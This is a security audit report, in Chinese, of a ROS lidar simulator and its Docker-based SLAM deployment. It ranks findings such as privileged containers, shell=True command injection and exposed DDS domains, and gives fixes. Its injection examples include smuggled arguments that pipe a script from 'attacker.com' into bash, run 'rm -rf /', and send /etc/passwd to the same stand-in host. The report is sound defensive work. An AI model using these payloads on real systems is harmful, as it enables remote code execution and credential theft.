# 安全审查报告

> **项目**: rosiwit_simulator — 为机器人添加 3D 激光雷达  
> **审查范围**: rosiwit_simulator（仿真）、rosiwit_slam（SLAM）、Docker 部署配置、CI/CD 管线  
> **审查日期**: 2026-05-05  
> **审查师**: 安全审查师  
> **置信度阈值**: ≥ 8/10  
> **审查结论**: ⚠️ **条件性通过**（无 Critical 阻塞，存在 3 个 High 级问题需修复）

---

## 一、审计摘要

| 检查项 | 状态 | 通过/总数 |
|--------|------|-----------|
| OWASP A01 — 失效的访问控制 | ⚠️ 部分通过 | 1/2 |
| OWASP A02 — 加密失败 | ✅ 通过 | 2/2 |
| OWASP A03 — 注入 | ⚠️ 存在风险 | 1/2 |
| OWASP A04 — 不安全的设计 | ✅ 通过 | 2/2 |
| OWASP A05 — 安全配置错误 | ⚠️ 部分通过 | 1/3 |
| OWASP A06 — 易受攻击的组件 | ✅ 通过 | 1/1 |
| OWASP A07 — 认证失败 | ✅ N/A | N/A |
| OWASP A08 — 软件和数据完整性 | ✅ 通过 | 1/1 |
| OWASP A09 — 日志和监控失败 | ✅ 通过 | 1/1 |
| OWASP A10 — SSRF | ✅ 通过 | 1/1 |
| **STRIDE 威胁建模** | ⚠️ 部分风险 | 4/6 |

**漏洞统计**: Critical: 0 | High: 3 | Medium: 4 | Low: 3  
**发布阻塞**: 无 Critical 级漏洞，**不阻塞发布**，但建议修复所有 High 级问题后再部署到生产环境。

---

## 二、漏洞列表（按严重程度排序）

### 🔴 High-01: Docker Compose 中使用 `privileged: true` 暴露完整主机设备访问

- **严重程度**: High  
- **置信度**: 9/10  
- **OWASP 分类**: A05 — 安全配置错误  
- **STRIDE 分类**: Elevation of Privilege（权限提升）  
- **位置**:  
  - `rosiwit_slam/docker/docker-compose.yml` 第 40 行（slam 服务）  
  - `rosiwit_slam/docker/docker-compose.yml` 第 110 行（slam-devel 服务）  

- **描述**:  
  Docker Compose 配置中生产 SLAM 容器同时设置了 `privileged: true`、`network_mode: host`、`ipc: host`，并且挂载了整个 `/dev:/dev` 设备目录。这意味着容器拥有对主机的完全访问权限，等同于主机 root 权限。

- **利用场景**:  
  攻击者若通过 ROS2 DDS 通信漏洞（ROS_DOMAIN_ID=0，默认域）或 ROS2 服务的未授权访问进入容器，可直接访问主机所有设备（包括磁盘 `/dev/sda`、网络接口等），实现从容器到主机的权限逃逸。

- **修复建议**:  
  ```yaml
  # 移除 privileged: true，改为按需暴露设备
  # privileged: true  ← 删除
  
  devices:
    - /dev/bus/usb:/dev/bus/usb    # 仅挂载 USB（LiDAR/IMU 设备）
  
  # 移除 /dev:/dev 卷挂载
  # volumes 中删除: - /dev:/dev
  
  # 添加安全限制
  security_opt:
    - no-new-privileges:true
  cap_drop:
    - ALL
  cap_add:
    - SYS_PTRACE      # 如需调试
    - NET_RAW         # 如需网络原始套接字
  ```

---

### 🔴 High-02: `shell=True` + f-string 构建 Shell 命令导致命令注入风险

- **严重程度**: High  
- **置信度**: 9/10  
- **OWASP 分类**: A03 — 注入（命令注入）  
- **STRIDE 分类**: Tampering（数据篡改）、Elevation of Privilege（权限提升）  
- **位置**:  
  - `rosiwit_slam/scripts/fetch_ntu_viral.py` 第 185-188 行（`shell=True`）  
  - `rosiwit_slam/scripts/fetch_ntu_viral.py` 第 206-222 行（`_build_download_command`）  
  - `rosiwit_slam/docker/run.sh` 第 176 行（`eval ${DOCKER_CMD}`）  

- **描述**:  
  `fetch_ntu_viral.py` 的 `_build_download_command` 方法通过 f-string 拼接用户可控的 `url` 和 `output_path` 参数生成 shell 命令，然后通过 `subprocess.run(..., shell=True)` 执行。  
  ```python
  # 第 210 行：URL 和路径通过 f-string 拼接到 shell 命令
  return f"wget {resume_flag} -O '{output_path}' '{url}'"
  ```
  虽然 URL 来自预定义的数据集配置（`NTU_VIRAL_DATASETS`），但如果用户通过命令行参数 `--output` 指定包含 shell 元字符（如 `'; rm -rf / #`）的路径，可造成命令注入。

  同样，`docker/run.sh` 第 176 行使用 `eval ${DOCKER_CMD}` 执行动态构建的命令字符串，如果参数中注入了 shell 命令则会被执行。

- **利用场景**:  
  ```bash
  # 恶意路径注入
  python3 fetch_ntu_viral.py --sequence NBV_ZJU_01 --output "/tmp/legit'; curl attacker.com/shell.sh | bash; echo '"
  # 将执行:
  # wget -c -O '/tmp/legit'; curl attacker.com/shell.sh | bash; echo '' 'https://...'
  ```

- **修复建议**:  
  ```python
  # 修复方案：使用 subprocess.run 的列表形式，避免 shell=True
  def _download(self, url: str, output_path: str, use_resume: bool):
      cmd = ["wget"]
      if use_resume:
          cmd.append("-c")
      cmd.extend(["-O", output_path, url])
      result = subprocess.run(cmd, check=True, cwd=str(self.output_dir))
  ```

---

### 🔴 High-03: Docker Compose 生产服务使用 `ROS_DOMAIN_ID=0` 且 `network_mode: host`

- **严重程度**: High  
- **置信度**: 8/10  
- **OWASP 分类**: A01 — 失效的访问控制  
- **STRIDE 分类**: Spoofing（身份伪造）、Information Disclosure（信息泄露）  
- **位置**:  
  - `rosiwit_slam/docker/docker-compose.yml` 第 29 行  
  - `rosiwit_slam/docker/docker-compose.yml` 第 34 行  

- **描述**:  
  Docker 生产服务配置 `ROS_DOMAIN_ID=0`（DDS 默认域）并使用 `network_mode: host`，意味着容器内的 ROS2 节点直接暴露在主机网络上，任何同网络的 ROS2 节点都可以：
  1. 订阅 SLAM 的点云数据（信息泄露）
  2. 发布虚假的点云/IMU 数据欺骗 SLAM 节点（身份伪造）
  3. 调用 SLAM 服务（`GlobalLocalize`、`SetInitialPose`）篡改定位结果

- **利用场景**:  
  攻击者在同一网络启动一个 ROS2 节点，向 `/ouster/points` topic 发布伪造的 PointCloud2 数据，导致 SLAM 构建的地图完全错误，机器人定位失效并可能碰撞障碍物。

- **修复建议**:  
  ```yaml
  environment:
    - ROS_DOMAIN_ID=42              # 使用非默认域 ID
    - RMW_IMPLEMENTATION=rmw_cyclonedds_cpp
  
  # 或在 ROS2 中启用 DDS Security（SROS2）:
  # 生成证书并配置环境变量
  ```

---

### 🟡 Medium-01: `rosiwit_simulator` 项目缺少 `.gitignore` 文件

- **严重程度**: Medium  
- **置信度**: 10/10  
- **OWASP 分类**: A02 — 敏感信息泄露  
- **STRIDE 分类**: Information Disclosure（信息泄露）  
- **位置**: `rosiwit_simulator/` 目录（文件不存在）  

- **描述**:  
  `rosiwit_simulator` 项目没有 `.gitignore` 文件，而 `rosiwit_slam` 项目有完善的 `.gitignore`（101行）。这意味着 build 产物、IDE 配置、临时文件、敏感数据等可能被意外提交到版本控制。

- **利用场景**:  
  开发者可能在 models 目录中意外提交包含商业机密的 3D 模型文件，或在 world 文件中包含内网 IP 地址等敏感信息。

- **修复建议**:  
  为 `rosiwit_simulator` 创建 `.gitignore` 文件，参考 `rosiwit_slam/.gitignore` 的规则。

---

### 🟡 Medium-02: Gazebo 差速驱动插件的 `rosDebugLevel` 设为 `Debug`

- **严重程度**: Medium  
- **置信度**: 9/10  
- **OWASP 分类**: A05 — 安全配置错误  
- **STRIDE 分类**: Information Disclosure（信息泄露）  
- **位置**: `rosiwit_simulator/world/room.world` 第 441 行  

- **描述**:  
  `room.world` 中差速驱动插件的日志级别设为 `Debug`，会在 ROS 日志中输出大量内部调试信息，包括：
  - 轮子编码器原始数据
  - TF 变换计算的中间值
  - 速度指令的详细处理过程
  
  这些信息在生产环境中无必要，且可能泄露内部实现细节，同时影响性能。

- **利用场景**:  
  通过 ROS2 日志系统获取详细的传感器和运动学数据，辅助逆向工程或构建更精确的欺骗攻击。

- **修复建议**:  
  ```xml
  <!-- 将 Debug 改为 Info 或 Warn -->
  <rosDebugLevel>Info</rosDebugLevel>
  ```

---

### 🟡 Medium-03: Docker Compose 中 `/dev/shm` 共享内存完全暴露

- **严重程度**: Medium  
- **置信度**: 8/10  
- **OWASP 分类**: A05 — 安全配置错误  
- **STRIDE 分类**: Information Disclosure（信息泄露）  
- **位置**: `rosiwit_slam/docker/docker-compose.yml` 第 50 行  

- **描述**:  
  多个 Docker 服务将主机的 `/dev/shm` 完全映射到容器内。容器内的进程可以读写主机上所有通过共享内存传递的数据（包括其他进程的 IPC 数据）。

- **利用场景**:  
  如果容器被入侵，攻击者可以通过 `/dev/shm` 读取其他容器或主机进程的共享内存数据（如 DDS 中间件的零拷贝传输数据）。

- **修复建议**:  
  使用 Docker 的 `--shm-size` 限制共享内存大小，或使用 tmpfs 替代：
  ```yaml
  tmpfs:
    - /dev/shm:size=1G
  ```

---

### 🟡 Medium-04: `docker/run.sh` 使用 `eval` 执行动态命令字符串

- **严重程度**: Medium  
- **置信度**: 8/10  
- **OWASP 分类**: A03 — 注入  
- **STRIDE 分类**: Elevation of Privilege（权限提升）  
- **位置**: `rosiwit_slam/docker/run.sh` 第 176 行  

- **描述**:  
  脚本通过逐步拼接字符串构建 Docker 命令，最后使用 `eval ${DOCKER_CMD}` 执行。如果用户通过脚本参数注入了 shell 元字符，会导致命令注入。

- **利用场景**:  
  ```bash
  # 如果参数未正确转义
  ./run.sh --name "test; curl attacker.com/exfil?data=$(cat /etc/passwd)"
  ```

- **修复建议**:  
  使用 bash 数组替代字符串拼接：
  ```bash
  DOCKER_CMD=(docker run --rm)
  DOCKER_CMD+=(--name "${CONTAINER_NAME}")
  # ...
  "${DOCKER_CMD[@]}"
  ```

---

### 🟢 Low-01: 新增 `lidar3d.xacro` 和 `lidar3d_gazebo.xacro` 使用硬编码的传感器参数

- **严重程度**: Low  
- **置信度**: 8/10  
- **OWASP 分类**: A05 — 安全配置错误  
- **STRIDE 分类**: N/A  
- **位置**:  
  - `rosiwit_simulator/urdf/xacro/sensors/lidar3d.xacro` 第 8-11 行  
  - `rosiwit_simulator/urdf/xacro/sensors/lidar3d_gazebo.xacro` 第 15-27 行  

- **描述**:  
  3D 激光雷达的参数（如扫描频率 `update_rate: 10`、噪声 `noise/mean: 0.0`、范围 `min/max`）直接硬编码在 xacro 文件中，无法通过 launch 文件参数动态配置。这虽然不是安全漏洞本身，但降低了配置灵活性，且无法在运行时通过参数服务器进行安全策略调整。

- **利用场景**:  
  无法根据环境动态调整传感器参数（如在不同安全等级的环境中调整噪声容差），增加了安全运维的难度。

- **修复建议**:  
  将关键参数通过 xacro 属性（`<xacro:property>`）或 launch 文件参数化：
  ```xml
  <xacro:property name="lidar_update_rate" value="$(arg lidar_update_rate)" />
  ```

---

### 🟢 Low-02: SLAM 配置文件中的 topic 名称与仿真不完全一致

- **严重程度**: Low  
- **置信度**: 8/10  
- **OWASP 分类**: N/A（兼容性问题）  
- **STRIDE 分类**: N/A  
- **位置**:  
  - `rosiwit_slam/config/velodyne_vlp16.yaml` 第 7 行 — `lidar_topic: "/velodyne_points"`  
  - `rosiwit_simulator/urdf/xacro/sensors/lidar3d_gazebo.xacro` 第 16 行 — `<topicName>/velodyne_points</topicName>`  

- **描述**:  
  Velodyne 配置与仿真的 topic 名称匹配正确（`/velodyne_points`），但 `rosiwit_slam/config/ouster_os1.yaml` 使用了不同的 topic（`/ouster/points`），而 `requirements.md` 中描述的也是 Ouster 方案。用户需要确保选择的配置文件与实际启动的 xacro 文件匹配，否则 SLAM 无法接收数据。

- **利用场景**:  
  误配导致 SLAM 无法接收点云数据，可能误判为系统故障，浪费时间排查。不是直接安全漏洞，但影响系统可用性。

- **修复建议**:  
  在 launch 文件中添加参数校验或自动 topic 重映射，并在 README 中明确说明配置匹配关系。

---

### 🟢 Low-03: `simulator_gazebo_3d.launch` 没有访问控制或参数校验

- **严重程度**: Low  
- **置信度**: 8/10  
- **OWASP 分类**: A05 — 安全配置错误  
- **STRIDE 分类**: Tampering（数据篡改）  
- **位置**: `rosiwit_simulator/launch/simulator_gazebo_3d.launch` 第 1-39 行  

- **描述**:  
  新增的 `simulator_gazebo_3d.launch` 文件没有对传入参数进行校验。例如 `world_name` 参数如果被恶意修改指向了非预期的 world 文件，可能导致仿真环境与预期不符。

- **利用场景**:  
  在 CI/CD 管线中，如果有人修改了 `world_name` 参数指向包含恶意 Gazebo 插件的 world 文件，可能执行未授权的代码。

- **修复建议**:  
  限制 world 文件的路径范围，或在 launch 文件中添加参数校验逻辑。

---

## 三、STRIDE 威胁建模汇总

| 威胁类型 | 风险等级 | 关联发现 | 说明 |
|----------|---------|---------|------|
| **Spoofing（身份伪造）** | ⚠️ High | High-03 | ROS2 DDS 默认域 + host 网络，任何节点可伪装为合法传感器发布虚假数据 |
| **Tampering（数据篡改）** | ⚠️ High | High-02 | 命令注入可能修改/删除数据文件 |
| **Repudiation（否认）** | ✅ Low | — | Docker 有日志配置（json-file driver, max-size: 100m），基本满足审计需求 |
| **Information Disclosure（信息泄露）** | ⚠️ Medium | Medium-02, Medium-03 | Debug 日志暴露内部数据；共享内存暴露 IPC 数据 |
| **Denial of Service（拒绝服务）** | ✅ Low | — | Docker 配置了资源限制（4 CPU / 8G 内存），降低了 DoS 风险 |
| **Elevation of Privilege（权限提升）** | ⚠️ High | High-01 | 容器 `privileged: true` 可直接逃逸到主机 |

---

## 四、新增文件安全评估

本次新增的 3D 激光雷达相关文件，从安全角度评估如下：

| 文件 | 安全评估 |
|------|---------|
| `urdf/xacro/sensors/lidar3d.xacro` | ✅ 安全。标准 URDF 链接和关节定义，无安全风险 |
| `urdf/xacro/sensors/lidar3d_gazebo.xacro` | ✅ 安全。标准 Gazebo 传感器插件配置，使用 `libgazebo_ros_velodyne_laser.so`，无已知漏洞 |
| `urdf/xacro/gazebo/mbot_with_lidar3d_gazebo.xacro` | ✅ 安全。标准 xacro include 组合，无新增风险 |
| `launch/simulator_gazebo_3d.launch` | ✅ 基本安全。标准 ROS1 launch 文件，参数默认值合理（`debug: false`） |

**结论**: 新增的 3D 激光雷达功能本身**未引入新的安全漏洞**。风险主要来自 rosiwit_slam 项目的部署配置（Docker）。

---

## 五、误报排除说明

| 初步发现 | 排除理由 |
|---------|---------|
| `end_to_end_test.py` 中使用 `subprocess.run(["wsl", ...])` | 测试脚本仅在开发环境运行，且参数为硬编码值，非用户可控，置信度 < 8，排除 |
| `Dockerfile` 中 `apt-get install` 安装大量包 | ROS2 开发环境所需，属于正常依赖，非安全漏洞 |
| `CMakeLists.txt` 中 `CMAKE_BUILD_TYPE Release` | 正确配置，Release 模式剥离调试符号，符合安全最佳实践 |
| `docker-compose.yml` 中 `user: "1000:1000"` | 良好实践：以非 root 用户运行容器，降低了部分权限提升风险 |
| `.gitlab-ci.yml` 和 `Jenkinsfile` 中未使用凭证 | CI 脚本仅做编译和测试，不需要凭证，属正常设计 |
| xacro 文件中 `xmlns:xacro` 命名空间 | 标准 ROS xacro 声明，非 XML 外部实体（XXE）漏洞 |

---

## 六、修复优先级建议

| 优先级 | 发现编号 | 建议修复时间 |
|--------|---------|-------------|
| P0 — 立即修复 | High-01（Docker privileged） | 发布前修复 |
| P0 — 立即修复 | High-02（命令注入） | 发布前修复 |
| P0 — 立即修复 | High-03（DDS 域暴露） | 生产部署前修复 |
| P1 — 计划修复 | Medium-01~04 | 下一迭代 |
| P2 — 适时修复 | Low-01~03 | 按排期处理 |

---

## 七、总结

本次为 rosiwit_simulator 添加 3D 激光雷达的变更本身**安全性良好**，新增的 URDF/Xacro 文件和 Gazebo 插件配置符合 ROS2 安全最佳实践。安全风险主要集中在关联的 `rosiwit_slam` 项目的部署配置中：

1. **Docker 安全加固不足**（privileged + host 网络 + /dev 挂载）是最大的安全风险
2. **Python 脚本中的命令注入**（shell=True + f-string）需要在发布前修复
3. **DDS 通信未做访问控制**，生产环境中需要通过 ROS_DOMAIN_ID 隔离或启用 SROS2

**建议**: 在 Docker 安全加固完成前，不要将 rosiwit_slam 部署到生产环境。rosiwit_simulator 的仿真环境可以在开发环境中安全使用。
